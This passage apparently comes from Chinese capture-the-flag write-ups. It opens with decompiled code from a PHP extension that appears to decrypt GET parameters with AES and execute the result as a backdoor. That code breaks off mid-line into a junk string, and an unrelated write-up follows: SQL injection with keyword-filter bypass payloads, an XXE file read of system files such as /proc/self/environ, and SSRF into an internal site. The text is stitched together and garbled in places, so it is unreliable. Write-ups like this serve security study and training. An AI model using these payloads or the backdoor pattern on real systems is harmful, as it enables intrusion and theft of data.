      {
        v11 = 0LL;
        v12 = (_QWORD *)zend_hash_str_find(&executor_globals[38], "_GET", 4LL);
        if ( v12 )
        {
          v35 = v12;
          if ( *((_BYTE *)v12 + 8) == 7 )
          {
            v10 = zend_hash_str_find(*v12, "key", 3LL);
            if ( v10 )
            {
              v11 = zend_hash_str_find(*v12, "content", 7LL);
              if ( v11 )
              {
                zend_error(2LL, *(_QWORD *)v10 + 24LL);
                zend_error(2LL, *(_QWORD *)v11 + 24LL);
              }
            }
          }
        }
        php_printf("%s", *(_QWORD *)v11 + 24LL);
        if ( v10 )
        {
          if ( v11 )
          {
            s = "openssl_decrypt";
            v16 = v15;
            v2 = strlen("openssl_decrypt");
            src = s;
            n = v2;
            v57 = v2;
            v58 = _emalloc((v2 + 32) & 0xFFFFFFFFFFFFFFF8LL);
            *(_DWORD *)v58 = 1;
            *(_DWORD *)(v58 + 4) = 6;
            v59 = v58;
            *(_QWORD *)(v58 + 8) = 0LL;
            *(_QWORD *)(v58 + 16) = v57;
            v60 = v58;
            memcpy((void *)(v58 + 24), src, n);
            *(_BYTE *)(v60 + n + 24) = 0;
            v17 = v60;
            *(_QWORD *)v16 = v60;
            *(_DWORD *)(v16 + 8) = 5126;
            v18 = (char *)(*(_QWORD *)v11 + 24LL);
            v19 = &v62;
            v3 = strlen(v18);
            v24 = v18;
            v51 = v3;
            v52 = v3;
            v53 = _emalloc((v3 + 32) & 0xFFFFFFFFFFFFFFF8LL);
            *(_DWORD *)v53 = 1;
            *(_DWORD *)(v53 + 4) = 6;
            v54 = v53;
            *(_QWORD *)(v53 + 8) = 0LL;
            *(_QWORD *)(v53 + 16) = v52;
            v55 = v53;
            memcpy((void *)(v53 + 24), v24, v51);
            *(_BYTE *)(v55 + v51 + 24) = 0;
            v21 = v55;
            *(_QWORD *)v19 = v55;
            *((_DWORD *)v19 + 2) = 5126;
            v22 = "AES-128-CBC";
            v23 = &v63;
            v4 = strlen("AES-128-CBC");
            v28 = v22;
            v46 = v4;
            v47 = v4;
            v48 = _emalloc((v4 + 32) & 0xFFFFFFFFFFFFFFF8LL);
            *(_DWORD *)v48 = 1;
            *(_DWORD *)(v48 + 4) = 6;
            v49 = v48;
            *(_QWORD *)(v48 + 8) = 0LL;
            *(_QWORD *)(v48 + 16) = v47;
            v50 = v48;
            memcpy((void *)(v48 + 24), v28, v46);
            *(_BYTE *)(v50 + v46 + 24) = 0;
            v25 = v50;
            *v23 = v50;
            *((_DWORD *)v23 + 2) = 5126;
            v26 = (char *)(*(_QWORD *)v10 + 24LL);
            v27 = &v64;
            v5 = strlen(v26);
            v33 = v26;
            v41 = v5;
            v42 = v5;
            v43 = _emalloc((v5 + 32) & 0xFFFFFFFFFFFFFFF8LL);
            *(_DWORD *)v43 = 1;
            *(_DWORD *)(v43 + 4) = 6;
            v44 = v43;
            *(_QWORD *)(v43 + 8) = 0LL;
            *(_QWORD *)(v43 + 16) = v42;
            v45 = v43;
            memcpy((void *)(v43 + 24), v33, v41);
            *(_BYTE *)(v45 + v41 + 24) = 0;
            v29 = v45;
            *v27 = v45;
            *((_DWORD *)v27 + 2) = 5126;
            v30 = &v65;
            v65 = 1LL;
            v66 = 4;
            v31 = "0000000000000000";
            v32 = &v67;
            v6 = strlen("0000000000000000");
            v13 = v31;
            v36 = v6;
            v37 = v6;
            v38 = _emalloc((v6 + 32) & 0xFFFFFFFFFFFFFFF8LL);
            *(_DWORD *)v38 = 1;
            *(_DWORD *)(v38 + 4) = 6;
            v39 = v38;
            *(_QWORD *)(v38 + 8) = 0LL;
            *(_QWORD *)(v38 + 16) = v37;
            v40 = v38;
            memcpy((void *)(v38 + 24), v13, v36);
            *(_BYTE *)(v40 + v36 + 24) = 0;
            v34 = v40;
            *v32 = v40;
            *((_DWORD *)v32 + 2) = 5126;
            if ( !(unsigned int)call_user_function_ex(executor_globals[54], 0LL, v15, &v61, 5LL, &v62, 0LL, 0LL)
              && *(_QWORD *)(v61 + 16) 
    >80qvlnyt0
### note（精英赛）
打开题目，又是一个登陆界面，按照之前的做题经验，不可能是无脑爆破，尝试使用万能密码进行登陆。
    username=admin' or 1#&password=123
登陆失败并返回
    admin' 1# maybe password error!
可以发现`or`没有了，估计是后台对部分关键字进行了替换为空。测试发现除了`or`，还有`select/and`被替换，直接采用双写即可绕过。
简单测试后，发现可以用布尔注入进行sql注入，条件为假时提示密码错误，条件为真时没有返回信息。
    username=admin' anandd oorrd(mid(user(),1,1))>1000#&password=admin 
    返回信息：admin' and ord(mid(user(),1,1))>1000# maybe password error!
    username=admin' anandd oorrd(mid(user(),1,1))>0#&password=admin    
    返回信息：nothing
修改一下tamper文件，用sqlmap最后注出admin密码为：a8ujj2fa2ddasd
登陆后发现一个留言窗口，输入类型为xml，那么很可能存在XXE，直接用常用的payload测试一下。
    ]>  
    &flag;  
发现可以正常读取文件。
尝试直接读取flag，但是试了`/flag`，`/flag.txt`，`/flag.php`均无果。直接拿burp fuzz一下常见的系统文件
    /proc/self/cmdline
    /proc/self/environ
    /proc/self/cwd/index.php
    /proc/self/mounts
    /etc/hosts
    /etc/httpd/conf/httpd.conf
    /etc/apache2/sites-enabled/000-default.conf
    /usr/local/etc/nginx/nginx.conf
    /etc/nginx/conf/nginx.conf
    /proc/self/fd/2
    /proc/self/fd/1
    /proc/self/fd/0
最后在`/etc/hosts`发现存在二层内网
    127.0.0.1   localhost
    ::1 localhost ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    172.55.2.11 68337dd50b7d
    172.55.2.10  inside_web.com
XXE+SSRF读取内网web
    ]>  
    &flag;  
base64解码后，发现内网网站可用`file`参数读取文件
        file browser
    plz set file to access
继续尝试直接读取flag
    ]>  
    &flag;  
这次成功了！
        file browser
    flag{f1eed0ffda188381fc2521e61b9a2788bb3a}